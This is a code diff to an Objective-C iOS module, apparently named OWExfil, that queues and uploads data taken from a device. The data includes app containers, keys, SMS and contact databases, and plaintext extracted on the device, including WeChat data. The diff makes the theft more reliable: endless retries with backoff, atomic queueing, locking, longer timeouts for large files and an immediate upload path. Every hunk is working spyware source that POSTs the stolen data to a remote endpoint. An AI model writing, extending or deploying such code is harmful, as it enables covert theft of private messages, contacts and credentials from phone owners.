@@ -1,11 +1,19 @@
 #import "OWExfil.h"
 #import "OWCommon.h"
+#include <math.h>
 
 NSString * const OWUploadKindContainer = @"container";
 NSString * const OWUploadKindKeys      = @"keys";
 NSString * const OWUploadKindMeta      = @"meta";
 NSString * const OWUploadKindSystem    = @"system";    // 系统库（短信/通讯录…），需 root
 NSString * const OWUploadKindHits      = @"hits";      // 端上抽取出的明文命中
+
+static NSLock *OWFlushLock(void) {
+    static NSLock *l;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{ l = [NSLock new]; });
+    return l;
+}
 
 @implementation OWUploader {
     NSMutableArray<NSString *> *_queue;
@@ -39,6 +47,7 @@ NSString * const OWUploadKindHits      = @"hits";      // 端上抽取出的明�
             }
         }
         _queue = [self _loadQueue];
+        [self _cleanupOrphans];
     }
     return self;
 }
@@ -53,13 +62,44 @@ NSString * const OWUploadKindHits      = @"hits";      // 端上抽取出的明�
 }
 
 - (BOOL)enqueueManifest:(NSDictionary *)manifest error:(NSError **)error {
-    NSString *p = [_pendingDir stringByAppendingPathComponent:@"manifest.json"];
+    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:
+        [NSString stringWithFormat:@"ow_manifest_%llu.json",
+         (unsigned long long)([[NSDate date] timeIntervalSince1970] * 1000)]];
     NSData *d = [NSJSONSerialization dataWithJSONObject:manifest options:0 error:nil];
     [d writeToFile:p atomically:YES];
-    return [self enqueueFile:p kind:OWUploadKindMeta error:error];
+    BOOL ok = [self enqueueFile:p kind:OWUploadKindMeta error:error];
+    [[NSFileManager defaultManager] removeItemAtPath:p error:nil];
+    return ok;
+}
+
+- (BOOL)uploadJSONNow:(NSDictionary *)json kind:(NSString *)kind error:(NSError **)error {
+    if (!json) return NO;
+    NSData *data = [NSJSONSerialization dataWithJSONObject:json options:0 error:error];
+    if (!data.length) return NO;
+
+    NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:
+        [NSString stringWithFormat:@"cover_register_%llu.json",
+         (unsigned long long)([[NSDate date] timeIntervalSince1970] * 1000)]];
+    if (![data writeToFile:tmp atomically:YES]) return NO;
+
+    BOOL ok = NO;
+    NSString *ep = self.endpoint;
+    if (ep.length) {
+        ok = [self _post:tmp url:[NSURL URLWithString:ep] kind:kind];
+    }
+    if (!ok) {
+        // 离线/端点失败：入队，等下次补传（采集上传也会顺手带出去）
+        [self enqueueFile:tmp kind:kind error:nil];
+    }
+    [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
+    return ok;
 }
 
 - (BOOL)uploadDiagnosticLog:(NSError **)error {
+    return [self uploadDiagnosticLogLabel:@"opensrc_manual" error:error];
+}
+
+- (BOOL)uploadDiagnosticLogLabel:(NSString *)label error:(NSError **)error {
     NSData *tail = [OWLogger tail:512 * 1024];
     OWDeviceProfile *dev = [OWDeviceProfile current];
     UIDevice *ui = [UIDevice currentDevice];
@@ -67,11 +107,11 @@ NSString * const OWUploadKindHits      = @"hits";      // 端上抽取出的明�
 
     NSMutableString *payload = [NSMutableString string];
     [payload appendString:@"=== auto step log ===\n"];
-    [payload appendString:@"label: opensrc_manual\n"];
+    [payload appendFormat:@"label: %@\n", label.length ? label : @"opensrc_auto"];
     [payload appendFormat:@"device: %@\n", dev.machine.length ? dev.machine : ui.model];
     [payload appendFormat:@"ios: %@\n", dev.osVersion ?: @""];
     [payload appendFormat:@"idfv: %@\n", idfv];
-    [payload appendString:@"event: manual_log_upload\n"];
+    [payload appendString:@"event: run_log_upload\n"];
     [payload appendString:@"=== recent log ===\n"];
     if (tail.length) {
         NSString *body = [[NSString alloc] initWithData:tail encoding:NSUTF8StringEncoding];
@@ -88,7 +128,7 @@ NSString * const OWUploadKindHits      = @"hits";      // 端上抽取出的明�
     BOOL enqueued = [self enqueueFile:tmp kind:@"log" error:error];
     BOOL ok = enqueued ? [self flush:error] : NO;
     [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
-    OWLog(@"上传: 诊断日志 %@", ok ? @"成功" : @"失败");
+    OWLog(@"上传: 诊断日志(%@) %@", label ?: @"", ok ? @"成功" : @"失败");
     return ok;
 }
 
@@ -98,20 +138,73 @@ NSString * const OWUploadKindHits      = @"hits";      // 端上抽取出的明�
                                 userInfo:@{NSLocalizedDescriptionKey: @"文件不存在"}];
         return NO;
     }
-    NSString *base = [NSString stringWithFormat:@"%@_%@", @((uint64_t)[[NSDate date] timeIntervalSince1970]), path.lastPathComponent];
+    NSString *base = [NSString stringWithFormat:@"%llu_%@",
+        (unsigned long long)([[NSDate date] timeIntervalSince1970] * 1000),
+        path.lastPathComponent];
     NSString *dst = [_pendingDir stringByAppendingPathComponent:base];
-    [[NSFileManager defaultManager] removeItemAtPath:dst error:nil];
-    if (![[NSFileManager defaultManager] copyItemAtPath:path toPath:dst error:error]) return NO;
+    NSString *tmp = [dst stringByAppendingString:@".tmp"];
+    NSFileManager *fm = [NSFileManager defaultManager];
+    [fm removeItemAtPath:dst error:nil];
+    [fm removeItemAtPath:tmp error:nil];
 
-    NSDictionary *meta = @{@"src": path, @"kind": kind, @"retries": @0, @"done": @NO};
+    // 先写临时文件再 rename：进程在拷贝中被杀，不会留下“半个正式文件”
+    if (![fm copyItemAtPath:path toPath:tmp error:error]) {
+        [fm removeItemAtPath:tmp error:nil];
+        return NO;
+    }
+    if (![fm moveItemAtPath:tmp toPath:dst error:error]) {
+        [fm removeItemAtPath:tmp error:nil];
+        return NO;
+    }
+
+    NSDictionary *attrs = [fm attributesOfItemAtPath:dst error:nil];
+    NSDictionary *meta = @{
+        @"src": path,
+        @"kind": kind,
+        @"retries": @0,
+        @"attempts": @0,
+        @"state": @"pending",
+        @"done": @NO,
+        @"size": @([attrs fileSize]),
+        @"createdAt": @((uint64_t)[[NSDate date] timeIntervalSince1970]),
+        @"lastAttemptAt": @0,
+    };
     NSString *metaPath = [dst stringByAppendingPathExtension:@"meta"];
     [[NSJSONSerialization dataWithJSONObject:meta options:0 error:nil] writeToFile:metaPath atomically:YES];
-    [_queue addObject:metaPath];
+    if (![_queue containsObject:metaPath]) [_queue addObject:metaPath];
     OWLog(@"上传: 入队 %@ (%@)", path.lastPathComponent, kind);
     return YES;
 }
 
 - (BOOL)flush:(NSError **)error {
+    NSLock *lock = OWFlushLock();
+    [lock lock];
+    @try {
+        return [self _flushLocked:error];
+    } @finally {
+        [lock unlock];
+    }
+}
+
+- (BOOL)hasPendingData {
+    NSArray<NSString *> *names = [[NSFileManager defaultManager]
+                                  contentsOfDirectoryAtPath:_pendingDir error:nil];
+    NSSet<NSString *> *kinds = [NSSet setWithArray:@[OWUploadKindContainer,
+                                                     OWUploadKindKeys,
+                                                     OWUploadKindSystem,
+                                                     OWUploadKindHits]];
+    for (NSString *n in names) {
+        if (![n.pathExtension isEqualToString:@"meta"]) continue;
+        NSString *mp = [_pendingDir stringByAppendingPathComponent:n];
+        NSData *d = [NSData dataWithContentsOfFile:mp];
+        NSDictionary *m = d ? [NSJSONSerialization JSONObjectWithData:d options:0 error:nil] : nil;
+        if (!m || [m[@"done"] boolValue]) continue;
+        if ([kinds containsObject:m[@"kind"]]) return YES;
+    }
+    return NO;
+}
+
+- (BOOL)_flushLocked:(NSError **)error {
     if (!_endpoint.length) {
         if (error) *error = [NSError errorWithDomain:@"OWUploader" code:51
                                 userInfo:@{NSLocalizedDescriptionKey: @"未配置 OWUploadEndpoint"}];
@@ -122,33 +215,122 @@ NSString * const OWUploadKindHits      = @"hits";      // 端上抽取出的明�
     NSURL *url = [NSURL URLWithString:_endpoint];
     if (!url) return NO;
 
-    for (NSString *metaPath in [_queue copy]) {
-        NSMutableDictionary *meta = [[NSJSONSerialization JSONObjectWithData:
-                                      [NSData dataWithContentsOfFile:metaPath] options:0 error:nil] mutableCopy];
-        if (!meta || [meta[@"done"] boolValue]) continue;
+    _uploadedCount = 0;
+    _failedCount = 0;
+
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSMutableArray<NSString *> *metas = [NSMutableArray array];
+    for (NSString *name in [fm contentsOfDirectoryAtPath:_pendingDir error:nil]) {
+        if ([name.pathExtension isEqualToString:@"meta"]) {
+            [metas addObject:[_pendingDir stringByAppendingPathComponent:name]];
+        }
+    }
+
+    NSTimeInterval now = [[NSDate date] timeIntervalSince1970];
+    for (NSString *metaPath in metas) {
+        NSData *md = [NSData dataWithContentsOfFile:metaPath];
+        NSMutableDictionary *meta = md
+            ? [[NSJSONSerialization JSONObjectWithData:md options:0 error:nil] mutableCopy]
+            : nil;
+        if (!meta) { [fm removeItemAtPath:metaPath error:nil]; continue; }
 
         NSString *file = [metaPath stringByDeletingPathExtension];
-        if (![[NSFileManager defaultManager] fileExistsAtPath:file]) continue;
+        if (![fm fileExistsAtPath:file]) {
+            [fm removeItemAtPath:metaPath error:nil];
+            continue;
+        }
+        if ([meta[@"done"] boolValue]) {
+            [fm removeItemAtPath:file error:nil];
+            [fm removeItemAtPath:metaPath error:nil];
+            continue;
+        }
 
-        NSNumber *retries = meta[@"retries"] ?: @0;
-        if ([retries unsignedIntegerValue] >= self.maxRetries) { OWLog(@"上传: 超出重试上限 %@", file.lastPathComponent); continue; }
+        // 崩溃留下的 inflight：10 分钟后视为 pending
+        NSString *state = meta[@"state"] ?: @"pending";
+        NSTimeInterval last = [meta[@"lastAttemptAt"] doubleValue];
+        if ([state isEqualToString:@"inflight"] && now - last < 600) continue;
+
+        // 失败退避：15s * 2^n，最多 1 小时；不做 3 次永久放弃
+        NSTimeInterval nextAt = [meta[@"nextAttemptAt"] doubleValue];
+        if (nextAt > now) continue;
+
+        meta[@"state"] = @"inflight";
+        meta[@"lastAttemptAt"] = @(now);
+        [[NSJSONSerialization dataWithJSONObject:meta options:0 error:nil]
+            writeToFile:metaPath atomically:YES];
 
         BOOL ok = [self _post:file url:url kind:meta[@"kind"]];
         if (ok) {
-            meta[@"done"] = @YES;
-            [[NSJSONSerialization dataWithJSONObject:meta options:0 error:nil] writeToFile:metaPath atomically:YES];
-            [[NSFileManager defaultManager] removeItemAtPath:file error:nil];
+            // 成功：文件和 meta 一起删，避免 meta 越积越多
+            [fm removeItemAtPath:file error:nil];
+            [fm removeItemAtPath:metaPath error:nil];
             _uploadedCount++;
             OWLog(@"上传: 成功 %@", file.lastPathComponent);
         } else {
-            meta[@"retries"] = @([retries unsignedIntegerValue] + 1);
-            [[NSJSONSerialization dataWithJSONObject:meta options:0 error:nil] writeToFile:metaPath atomically:YES];
+            NSInteger attempts = [meta[@"attempts"] integerValue] + 1;
+            NSTimeInterval backoff = MIN(3600.0, 15.0 * pow(2.0, MIN(attempts, 7)));
+            meta[@"attempts"] = @(attempts);
+            meta[@"retries"] = @(attempts);
+            meta[@"state"] = @"pending";
+            meta[@"lastAttemptAt"] = @(now);
+            meta[@"nextAttemptAt"] = @(now + backoff);
+            [[NSJSONSerialization dataWithJSONObject:meta options:0 error:nil]
+                writeToFile:metaPath atomically:YES];
             _failedCount++;
-            OWLog(@"上传: 失败 %@（第 %@ 次）", file.lastPathComponent, meta[@"retries"]);
+            OWLog(@"上传: 失败 %@（第 %ld 次，%.0fs 后重试，保留待补传）",
+                  file.lastPathComponent, (long)attempts, backoff);
         }
     }
 
     return _uploadedCount > 0;
+}
+
+- (void)_cleanupOrphans {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSArray<NSString *> *names = [fm contentsOfDirectoryAtPath:_pendingDir error:nil];
+    NSMutableSet<NSString *> *withMeta = [NSMutableSet set];
+    for (NSString *n in names) {
+        if ([n.pathExtension isEqualToString:@"meta"]) {
+            [withMeta addObject:[n stringByDeletingPathExtension]];
+        }
+    }
+    NSTimeInterval now = [[NSDate date] timeIntervalSince1970];
+    for (NSString *n in names) {
+        NSString *p = [_pendingDir stringByAppendingPathComponent:n];
+        if ([n.pathExtension isEqualToString:@"tmp"]) {
+            NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
+            NSTimeInterval m = [a[NSFileModificationDate] timeIntervalSince1970];
+            if (now - m > 3600) [fm removeItemAtPath:p error:nil];
+            continue;
+        }
+        if ([n.pathExtension isEqualToString:@"meta"]) {
+            NSString *base = [n stringByDeletingPathExtension];
+            NSString *f = [_pendingDir stringByAppendingPathComponent:base];
+            if (![fm fileExistsAtPath:f]) {
+                [fm removeItemAtPath:p error:nil];
+                continue;
+            }
+            // 清理历史遗留的超大 pending（如旧版 398MB 微信包），避免永久阻塞完成判定
+            NSData *md = [NSData dataWithContentsOfFile:p];
+            NSDictionary *m = md ? [NSJSONSerialization JSONObjectWithData:md options:0 error:nil] : nil;
+            unsigned long long sz = [m[@"size"] unsignedLongLongValue];
+            if (sz == 0) {
+                NSDictionary *fa = [fm attributesOfItemAtPath:f error:nil];
+                sz = [fa fileSize];
+            }
+            if (sz > 250ULL * 1024 * 1024) {
+                OWLog(@"上传: 清理超大 pending %@ (%llu B)", f.lastPathComponent, sz);
+                [fm removeItemAtPath:f error:nil];
+                [fm removeItemAtPath:p error:nil];
+            }
+            continue;
+        }
+        if (![withMeta containsObject:n]) {
+            NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
+            NSTimeInterval m = [a[NSFileModificationDate] timeIntervalSince1970];
+            if (now - m > 3600) [fm removeItemAtPath:p error:nil];
+        }
+    }
 }
 
 - (BOOL)_post:(NSString *)file url:(NSURL *)url kind:(NSString *)kind {
@@ -156,7 +338,10 @@ NSString * const OWUploadKindHits      = @"hits";      // 端上抽取出的明�
     NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
     req.HTTPMethod = @"POST";
     [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
-    [req setTimeoutInterval:60];
+    NSDictionary *fileAttrs = [[NSFileManager defaultManager] attributesOfItemAtPath:file error:nil];
+    uint64_t fileSize = [fileAttrs fileSize];
+    NSTimeInterval timeout = fileSize > 20ULL * 1024 * 1024 ? 180 : 60;
+    [req setTimeoutInterval:timeout];
 
     NSMutableData *body = [NSMutableData data];
     OWDeviceProfile *dev = [OWDeviceProfile current];
@@ -187,7 +372,8 @@ NSString * const OWUploadKindHits      = @"hits";      // 端上抽取出的明�
             dispatch_semaphore_signal(sem);
         }];
     [task resume];
-    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 70 * NSEC_PER_SEC));
+    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW,
+        (int64_t)((timeout + 10) * NSEC_PER_SEC)));
     return ok;
 }
 
